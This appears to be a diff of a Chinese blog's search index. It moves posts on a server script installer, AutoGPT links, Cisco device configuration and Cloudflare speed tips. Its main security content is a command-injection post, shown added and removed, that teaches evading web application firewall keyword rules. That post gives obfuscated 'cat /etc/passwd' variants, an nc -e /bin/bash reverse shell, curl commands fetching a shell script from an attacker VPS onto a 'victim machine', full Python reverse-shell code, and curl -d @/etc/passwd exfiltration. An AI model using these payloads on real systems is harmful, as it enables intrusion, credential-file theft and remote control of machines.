-<pre><code>wget https://blog.alone-hk.cn//Download/kejilion.sh &amp;&amp; chmod +x kejilion.sh &amp;&amp; ./kejilion.sh
-</code></pre>
-<p>若以上地址你无法使用请尝试</p>
-<pre><code>wget https://blog.alone-hk.cn//Download/kejilion.sh &amp;&amp; chmod +x kejilion.sh &amp;&amp; ./kejilion.sh
-</code></pre>
-<p>脚本展示图</p>
-<p><a href="https://s1.ax1x.com/2023/08/13/pPufa9K.png"><img src="https://s1.ax1x.com/2023/08/13/pPufa9K.png" alt="img"></a></p>
-<p>目前只支持Ubuntu和Debian系统，暂不支持其它系统！</p>
-<p>此脚本目前比较基础，会不断进化，整合大家常用的脚本。方便使用。</p>
-<p>LDNMP属于原创内容，建站更方便。</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>建站</tag>
-        <tag>warp</tag>
-        <tag>Docker</tag>
-      </tags>
   </entry>
   <entry>
     <title>人工智能AI大战：BARD、ChatGPT、Bing和文心一言谁更具有优势？</title>
@@ -560,6 +540,87 @@
       </tags>
   </entry>
   <entry>
+    <title>命令注入之Web应用防火墙绕过技巧</title>
+    <url>/2023/07/22/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B9%8BWeb%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>使用通配符绕过防火墙规则 例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
+<span id="more"></span>
+
+<p>使用通配符绕过防火墙规则</p>
+<p>例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd</p>
+<p>&#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-22.png" alt="图片"></p>
+<p>有时候我们想用netcat在目标机器上反弹一个端口，那么可以如下操作：</p>
+<p>&#x2F;???&#x2F;n? -e &#x2F;???&#x2F;b??h 127.0.0.1 6666</p>
+<p># &#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;bash 127.0.0.1 6666</p>
+<p># -e 后面跟上你要执行的程序，在连接成功后会自动运行该程序</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-23.png" alt="图片"></p>
+<p>当然，你还可以使用*星号、[0-9]字符集等匹配符来获取相关信息，有关标准通配符的更多信息可以在终端中键入 命令 man 7 glob，按照手册进行学习。</p>
+<p>使用字符串拼接绕过防火墙规则</p>
+<p>连接字符串的操作符主要有以下几种</p>
+<p>在python、Java中使用 + 号；在PHP、perl中使用 . 号；在lua语言中则使用 .. 符号来连接字符串。而这些编程语言中的一些字符串连接符，有时候在bash中也可以达到字符连接的效果，这就导致我们可以绕过一些Web应用防火墙规则(例如基于关键词匹配的防火墙规则)。</p>
+<p>root@kali:~# echo Mochazz</p>
+<p>Mochazz</p>
+<p>root@kali:~# echo Mo”’chazz’</p>
+<p>Mochazz</p>
+<p>root@kali:~# echo ‘Mo”chazz’</p>
+<p>Mochazz</p>
+<p>root@kali:~# echo ‘M’och’az’z</p>
+<p>Mochazz</p>
+<p>看一条pm匹配规则（防火墙规则）</p>
+<p># Detect suspicious client by looking at the user agent identification</p>
+<p>SecRule REQUEST_HEADERS:User-Agent “@pm passwd shadow” “id:166″</p>
+<p>这条规则将忽略大小写进行匹配，如果匹配中passwd或shadow词组，即进行阻断，但是如果我们使用字符串拼接，则可以绕过改规则</p>
+<p>root@kali:~# &#x2F;’b’i”n&#x2F;’c”a’t &#x2F;e’t’c&#x2F;p”as”sw’d’</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-24.png" alt="图片"></p>
+<p>使用以下命令在受害机上下载用于反弹shell的脚本</p>
+<p>curl -v “<a href="http://vps的ip/shell.py%E2%80%9D">http://VPS的IP/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-25.png" alt="图片"></p>
+<p>shell.py 代码如下</p>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;python</p>
+<p>import socket,subprocess,os</p>
+<p>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</p>
+<p>s.connect((“<my ip address>”,2375))</p>
+<p>os.dup2(s.fileno(),0)</p>
+<p>os.dup2(s.fileno(),1)</p>
+<p>os.dup2(s.fileno(),2)</p>
+<p>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”])</p>
+<p>提前在你的VPS上用nc侦听一个端口</p>
+<p>nc -lvp [port]</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-26.png" alt="图片"></p>
+<p>更进一步，我们可以将点分十进制的IP转换成长整数IP，例如</p>
+<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://127.0.0.1/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
+<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://2130706433/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
+<p>使用 \ 符号来绕过WAF</p>
+<p>root@kali:~# c\a\t &#x2F;etc&#x2F;passwd</p>
+<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
+<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
+<p>games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>使用 \ 符号加回车来绕过WAF</p>
+<p>root@kali:~# c\</p>
+<p>&gt; at &#x2F;e’t’c&#x2F;p”a’s’swd</p>
+<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
+<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
+<p>使用curl -d参数读取本地文件</p>
+<p>curl -d @&#x2F;<file> <remote server></p>
+<p>例如</p>
+<p>curl -d @&#x2F;etc&#x2F;passwd 127.0.0.1:8888</p>
+<p># 在本地侦听8888端口即可接受到数据</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-27.png" alt="图片"></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>域名注册教学和cloudflare域名解析教程</title>
     <url>/2023/07/21/%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E6%95%99%E5%AD%A6%E5%92%8Ccloudflare%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%95%99%E7%A8%8B/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>域名注册教学和cloudflare域名解析教程</p>
@@ -589,6 +650,27 @@
       <tags>
         <tag>cloudflare</tag>
         <tag>免费cdn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>什么是全自动 AI？AutoGPT 安装部署使用教程</title>
+    <url>/2023/07/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%A8%E8%87%AA%E5%8A%A8-AI%EF%BC%9F/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>AutoGPT 安装部署使用教程</p>
+<span id="more"></span>
+
+<p>视频教程:</p>
+<p>AgentGPT: <a href="https://agentgpt.reworkd.ai/">https://agentgpt.reworkd.ai/</a></p>
+<p>AutoGPT 安装指令: <a href="https://github.com/Significant-Gravitas/Auto-GPT">https://github.com/Significant-Gravitas/Auto-GPT</a></p>
+<p>OpenAI API Key: <a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
+<p>Pinecone API Key: <a href="https://app.pinecone.io/organizations">https://app.pinecone.io/organizations</a></p>
+]]></content>
+      <categories>
+        <category>实用分享</category>
+      </categories>
+      <tags>
+        <tag>ai</tag>
+        <tag>AutoGPT</tag>
+        <tag>人工智能</tag>
       </tags>
   </entry>
   <entry>
@@ -1352,84 +1434,80 @@
       </tags>
   </entry>
   <entry>
-    <title>命令注入之Web应用防火墙绕过技巧</title>
-    <url>/2023/07/22/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B9%8BWeb%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>使用通配符绕过防火墙规则 例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
+    <title>思科模拟器网络搭建命令</title>
+    <url>/2024/03/06/%E6%80%9D%E7%A7%91%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>网络搭建</p>
 <span id="more"></span>
 
-<p>使用通配符绕过防火墙规则</p>
-<p>例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd</p>
-<p>&#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-22.png" alt="图片"></p>
-<p>有时候我们想用netcat在目标机器上反弹一个端口，那么可以如下操作：</p>
-<p>&#x2F;???&#x2F;n? -e &#x2F;???&#x2F;b??h 127.0.0.1 6666</p>
-<p># &#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;bash 127.0.0.1 6666</p>
-<p># -e 后面跟上你要执行的程序，在连接成功后会自动运行该程序</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-23.png" alt="图片"></p>
-<p>当然，你还可以使用*星号、[0-9]字符集等匹配符来获取相关信息，有关标准通配符的更多信息可以在终端中键入 命令 man 7 glob，按照手册进行学习。</p>
-<p>使用字符串拼接绕过防火墙规则</p>
-<p>连接字符串的操作符主要有以下几种</p>
-<p>在python、Java中使用 + 号；在PHP、perl中使用 . 号；在lua语言中则使用 .. 符号来连接字符串。而这些编程语言中的一些字符串连接符，有时候在bash中也可以达到字符连接的效果，这就导致我们可以绕过一些Web应用防火墙规则(例如基于关键词匹配的防火墙规则)。</p>
-<p>root@kali:~# echo Mochazz</p>
-<p>Mochazz</p>
-<p>root@kali:~# echo Mo”’chazz’</p>
-<p>Mochazz</p>
-<p>root@kali:~# echo ‘Mo”chazz’</p>
-<p>Mochazz</p>
-<p>root@kali:~# echo ‘M’och’az’z</p>
-<p>Mochazz</p>
-<p>看一条pm匹配规则（防火墙规则）</p>
-<p># Detect suspicious client by looking at the user agent identification</p>
-<p>SecRule REQUEST_HEADERS:User-Agent “@pm passwd shadow” “id:166″</p>
-<p>这条规则将忽略大小写进行匹配，如果匹配中passwd或shadow词组，即进行阻断，但是如果我们使用字符串拼接，则可以绕过改规则</p>
-<p>root@kali:~# &#x2F;’b’i”n&#x2F;’c”a’t &#x2F;e’t’c&#x2F;p”as”sw’d’</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-24.png" alt="图片"></p>
-<p>使用以下命令在受害机上下载用于反弹shell的脚本</p>
-<p>curl -v “<a href="http://vps的ip/shell.py%E2%80%9D">http://VPS的IP/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-25.png" alt="图片"></p>
-<p>shell.py 代码如下</p>
-<p>#!&#x2F;usr&#x2F;bin&#x2F;python</p>
-<p>import socket,subprocess,os</p>
-<p>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</p>
-<p>s.connect((“<my ip address>”,2375))</p>
-<p>os.dup2(s.fileno(),0)</p>
-<p>os.dup2(s.fileno(),1)</p>
-<p>os.dup2(s.fileno(),2)</p>
-<p>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”])</p>
-<p>提前在你的VPS上用nc侦听一个端口</p>
-<p>nc -lvp [port]</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-26.png" alt="图片"></p>
-<p>更进一步，我们可以将点分十进制的IP转换成长整数IP，例如</p>
-<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://127.0.0.1/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://2130706433/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p>使用 \ 符号来绕过WAF</p>
-<p>root@kali:~# c\a\t &#x2F;etc&#x2F;passwd</p>
-<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
-<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
-<p>games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>使用 \ 符号加回车来绕过WAF</p>
-<p>root@kali:~# c\</p>
-<p>&gt; at &#x2F;e’t’c&#x2F;p”a’s’swd</p>
-<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
-<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
-<p>使用curl -d参数读取本地文件</p>
-<p>curl -d @&#x2F;<file> <remote server></p>
-<p>例如</p>
-<p>curl -d @&#x2F;etc&#x2F;passwd 127.0.0.1:8888</p>
-<p># 在本地侦听8888端口即可接受到数据</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-27.png" alt="图片"></p>
+<!--
+
+[toc]
+
+  -->
+
+<h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>R1&gt;<strong>enable</strong>    &#x2F;&#x2F;进入特权模式 <br /><br>R1#<strong>disable</strong>    &#x2F;&#x2F;退出特权模式 <br /><br>R1(config)#<strong>hostname</strong> SW1    &#x2F;&#x2F;更改主机名为SW1 <br /><br>R1(config)#<strong>interface</strong> Ethernet0&#x2F;1    &#x2F;&#x2F;进入e0&#x2F;1接口 <br /><br>R1(config-if)#<strong>no shutdown</strong>     &#x2F;&#x2F;开启接口及协议 <br /><br>R1(config-if)#<strong>shutdown</strong>    &#x2F;&#x2F;关闭接口 <br /><br>R1(config)#<strong>end</strong>    &#x2F;&#x2F;返回用户模式 <br /><br>R1#<strong>show ip interface brief</strong>    &#x2F;&#x2F;简要查看接口状态 <br /><br>R1#<strong>show running-config</strong>    &#x2F;&#x2F;查看已配置信息 <br /><br>R1#<strong>write</strong>    &#x2F;&#x2F;保存配置 <br /><br>R1(config)#<strong>interface</strong> Ethernet0&#x2F;1 <br /><br>R1(config-if)#<strong>ip address</strong> 172.1.0.129 255.255.255.192    &#x2F;&#x2F;为接口配置ip地址 <br /><br>R1(config-if)#<strong>ipv6 address</strong> 2012::1&#x2F;64    &#x2F;&#x2F;在接口上配置ipv6地址 <br /></p>
+<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>Switch&gt;enable <br /><br>Switch#config <br /><br>Switch(config)#<strong>hostname</strong> SW1 <br /><br>SW1(config)#<strong>vlan</strong> 2 <br /><br>SW1(config-vlan)#exit <br /><br>SW1(config)#<strong>interface vlan</strong> 2 <br /><br>SW1(config-if)#<strong>ip add</strong> 172.15.5.2 255.255.255.252 <br /><br>SW1(config-if)#exit <br /><br>SW1(config)#<strong>interface</strong> f0&#x2F;1	&#x2F;&#x2F;（进入端口） <br /><br>SW1(config-if)#<strong>switchport</strong> mode access  <br /><br>SW1(config-if)#<strong>switchport</strong> access vlan 2	&#x2F;&#x2F;（将valn2设进端口中） <br /><br>SW1(config-if)#no shutdown	&#x2F;&#x2F;（打开端口） <br /><br>SW1(config-if)#exit <br /><br>SW1(config)#exit <br /><br>SW1#<strong>show vlan</strong>	&#x2F;&#x2F;（查看vlan在哪个端口） <br /><br>SW1#**show interface **	&#x2F;&#x2F;(所有端口) <br />SW1#<strong>show ip interface brief</strong>    &#x2F;&#x2F;简要查看接口状态 <br /><br>SW1#<strong>show running-config</strong>    &#x2F;&#x2F;查看已配置信息 <br />SW1#show interface	&#x2F;&#x2F;端口名（单个端口） <br />SW1(config-if)#<strong>switchport</strong> mode trunk  &#x2F;&#x2F;设置接口为trunk</p>
+<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>1、防火墙的基本配置<br>ciscoasa&gt; en	<br>Password:	默认特权密码为空，直接回车即可<br>ciscoasa# conf t	<br>ciscoasa(config)# hostname 防火墙名称	<br>2、配置特权密码<br>asa(config)# enable password 密码	<br>3、配置远程登录密码（在使用Telnet或SSH时需要输入的密码）<br>asa(config)# passwd 密码	<br>4、配置接口名称和接口安全级别<br>asa(config)# in e0&#x2F;0	<br>asa(config-if)# nameif 接口名称	<br>asa(config-if)# security-level 安全级别{0~100}	<br>如果ASA的型号是5505，则不支持在物理接口上直接进行以上配置，必须通过VLAN虚接口来配置<br>asa(config)#int vlan 1	<br>asa(config-if)# nameif inside	<br>asa(config-if)# security-level 100	<br>asa(config-if)#ip add 10.1.1.254 255.255.255.0	<br>asa(config-if)# no shut	<br>查看conn表	<br>asa#show conn detail	<br>5、配置ACL<br>（1）允许入站连接<br>asa(config)# access-list out_to_in permit ip host 172.16.1.5 host 10.1.1.7	允许外网主机172.16.1.5访问内网主机10.1.1.7，out_to_in为ACL组名<br>asa(config)# access-group out_to_in in int outside	将组名为out_to_in的ACL应用在outside接口<br>（2）控制出站连接的流量<br>asa(config)# access-list in_to_out deny ip 10.0.0.0 255.0.0.0 any	拒绝内网10.0.0.0网段 访问外网所有网段<br>asa(config)# access-list in_to_out permit ip any any	允许其他所有流量通行，因为ACL有隐含的拒绝语句，所以配置ACL时，一般都需要允许所有流量<br>asa(config)# access-group in_to_out in int inside	应用在内网接口<br>（3）ACL其他配置<br>ICMP协议<br>默认情况下，禁止ICMP报文穿越ASA是基于安全性的考虑，有时候为了方便调试，可以配置暂时允许ICMP应答报文穿越ASA</p>
+<p>ciscoasa(config)# access-list 111 permit icmp any any	定义ACL<br>ciscoasa(config)# access-group 111 in int outside	应用到outside接口<br>6、配置静态路由<br>asa(config)# route outside 172.16.0.0 255.255.0.0 10.0.0.1	去往外网172.16.0.0网段的流量下一跳为10.0.0.1<br>asa(config)# route inside 192.168.1.0 255.255.255.0 192.168.2.1	去往内网192.168.1.0网段的流量下一跳为192.168.2.1<br>7、配置命令补充<br>no在前面，当配置错一条命令后，可以在原先的配置命令前加no即可删除配置错的那条命令</p>
+<p>ciscoasa# write memory	保存running configuration配置到startup configuration<br>ciscoasa# copy running-config startup-config	保存running configuration配置到startup configuration<br>ciscoasa(config)# clear configure all	清除running configuration的所有配置<br>ciscoasa(config)# clear configure access-list	清除所有acces-list命令的配置<br>ciscoasa(config)# clear configure access-list in_to_out	只清除access-list in_to_out 的配置<br>ciscoasa# write erase	删除startup-config配置文件<br>8、远程管理ASA<br>ASA支持三种主要的远程管理接入方式：Telnet 、ssh和ASDM</p>
+<p>（1）Telnet配置实例<br>由于使用Telnet远程管理是不安全的，所以一般禁止从外部接口使用Telnet接入，而只允许在内网使用Telnet</p>
+<p>配置允许从inside区域内的192.168.0.0&#x2F;24网段使用telnet接入	<br>ciscoasa(config-if)# telnet 192.168.0.0 255.255.255.0 inside(接口名字)	<br>或者允许单个主机Telnet防火墙（两者根据需要二选一即可）	<br>ciscoasa(config)# telnet 192.168.0.1 255.255.255.255 inside(接口名字)	<br>配置空闲超时时间为30分钟	<br>ciscoasa(config)# telnet timeout 30(1~1440min,默认5min)	<br>（2）配置SSH接入<br>配置主机名和域名，因为在生成RSA密钥对的过程中需要用到主机名和域名<br>ciscoasa(config-if)# host 主机名	配置主机名<br>aaa(config)# domain-name 域名{.com}	配置域名<br>aaa(config)# crypto key generate rsa modulus 1024	指定modulus的大小为1024位，大小可以为512位,768位,1024位或2048位，表示生成的RSA密钥的长度<br>aaa(config)# ssh 192.168.1.0 255.255.255.0 inside	允许内网1.0的网段SSH接入<br>aaa(config)# ssh 0 0 outside	允许外网任何主机SSH接入<br>aaa(config)# ssh timeout 30	配置超时时间为30分钟<br>aaa(config)# ssh version 2	启用SSH的版本2，该命令为可选<br>版本1和版本2，区别是安全机制不一样，配置SSH接入完成后，可以在outside区域内的主机上使用SecureCRT或putty等工具登录ASA的outside接口，注意ASA默认使用用户名为pix，密码为使用password命令设置的密码</p>
+<p>9、ASA防火墙配置NAT<br>（1）动态PAT转换配置<br>把内部全局地址10.1.1.2转换为30.1.1.100<br>ASA(config)# nat (×××ide){名称，outside或inside} nat名称 10.1.1.0 255.255.255.0	声明内部地址<br>ASA(config)# global (outside) nat名称 30.1.1.100-30.1.1.200	声明全局地址，nat名称与内部nat名称要相同<br>ASA(config)# show xlate detai	查看NAT地址转换表<br>转换为outside接口的地址<br>ASA(config)# nat (×××ide){名称，outside或inside} nat名称 10.1.1.0 255.255.255.0	声明内部地址，nat-id为1<br>ASA(config)# global (outside) 1 interface	声明内部地址全部转换为outside区域接口地址<br>（2）静态NAT转换配置<br>dmz区域的20.1.1.2 映射成公网地址100.1.1.1访问<br>ASA(config)# static (dmz,outside) 100.1.1.1 20.1.1.2	第一个IP地址是公网IP地址，第二地址是dmz区域服务器的真实IP地址<br>ASA(config)# access-list 100 permit ip host 30.1.1.2 host 100.1.1.1	<br>ASA(config)# access-group 100 in int outside	设置ACL允许outside区域访问dmz区域，但是访问的是映射后的地址<br>（3）静态PAT转换配置方法<br>将内部的服务器映射到公网同一个IP，不同端口号<br>ASA(config)# static (dmz,outside) tcp 100.1.1.1 http 20.1.1.2 http	<br>ASA(config)# static (dmz,outside) tcp 100.1.1.1 smtp 20.1.1.3 smtp	将内部服务器地址映射到同一个公网地址不同端口号<br>ASA(config)# access-list out_to_dmz permit ip host 30.1.1.2 host 100.1.1.1	<br>ASA(config)# access-group out_to_dmz in int outside	设置ACL允许outside区域访问dmz区域，但是访问的是映射后的地址<br>（4）NAT豁免配置方法<br>ASA(config)# nat-control	表示通过ASA防火墙的数据包都必须使用NAT地址转换技术<br>ASA(config)# access-list ACL组名 extended permit ip 10.1.1.0 255.255.255.0 30.1.1.0 255.255.255.0	<br>ASA(config)# nat (×××ide) 0 access-list ACL组名	×××ide接口应用ACL，注意nat名称为0 表示使用NAT豁免，优先级最高，就是ACL中的地址经过ASA防火墙时，不需要进行地址转换</p>
+<p>原文链接：<a href="https://blog.csdn.net/le616616/article/details/120644648">https://blog.csdn.net/le616616/article/details/120644648</a></p>
+<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><blockquote>
+<p>windows 与Linux配置</p>
+</blockquote>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>暂无</p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>暂无</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>提高Cloudflare站点在中国的体验</title>
+    <url>/2023/07/21/%E6%8F%90%E9%AB%98Cloudflare%E7%AB%99%E7%82%B9%E5%9C%A8%E4%B8%AD%E5%9B%BD%E7%9A%84%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>中国对Cloudflare网络的速度会有很大程度的劣化，所以在上面的网站访问速度也会非常烂</p>
+<span id="more"></span>
+
+<p>从此，Cloudflare不再是减速CDN了</p>
+<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>众所周知，因为很多人用Cloudflare当作梯子中转之类的原因，中国对Cloudflare网络的速度会有很大程度的劣化，所以在上面的网站访问速度也会非常烂。最近我发现了一个不错的办法可以在一定程度上避免这个问题，所以今天就来说一说。</p>
+<h1 id="普通用户的解决方法"><a href="#普通用户的解决方法" class="headerlink" title="普通用户的解决方法"></a>普通用户的解决方法</h1><p>对于网站的访问者来说，使用<a href="https://github.com/XIU2/CloudflareSpeedTest">CloudflareSpeedTest</a>这个工具就挺不错的，它能检测到当前网络连哪个IP是最好的。因为Cloudflare网络用的是Anycast，无论从哪个IP进入都可以，所以用这个检测出来的IP直接改Hosts访问就能解决访问网站慢的问题。<br>不过有些地区可能是服务商主动对Cloudflare的IP段进行限速，那这样有可能测试出来没有可以使用的节点，那么还有一种方法，网络上有些可能是企业之类的人会反代Cloudflare的网站用于解决在国内访问慢的问题，并且没有对host头做限制，那么这些第三方的节点同样也可以作为访问Cloudflare网站的方法。具体怎么找到这样的IP有一个<a href="https://github.com/ip-scanner/cloudflare">仓库</a>每天都会扫描全网去找像这样的节点。<br>当然这些节点也不是所有的IP从中国连接速度都很好，这时候可以把这个仓库的所有IP收集起来然后再丢给CloudflareSpeedTest去测试，具体我写了个简单的脚本来处理：</p>
+<pre><code>git clone https://github.com/ip-scanner/cloudflare.git
+cat cloudflare/*.txt &gt; proxy.txt
+./CloudflareST -allip -sl 0.1 -f proxy.txt -n 500
+</code></pre>
+<p>这样获得的第三方IP就基本上不会被限速，里面甚至有可能有通过IPLC或者IEPL的节点，包括拿来当梯子中转速度都几乎可以跑满带宽，另外还有一个优点是这样Cloudflare获得的IP就是第三方节点的IP，可以起到匿名的作用。</p>
+<h1 id="对于站长的解决方法"><a href="#对于站长的解决方法" class="headerlink" title="对于站长的解决方法"></a>对于站长的解决方法</h1><p>上面的方法相当于是用户自己去解决访问的问题，但是操作可能还是会有点复杂，所以对于网站站长来说不可能去期待访客通过这种方法来提高访问自己网站的速度。不过Cloudflare网站接入只能通过NS方式接入，这样接入的话域名解析的IP就是自动分配的，没办法自己设定解析，也就不能选择更合适的IP，另外之前用CF 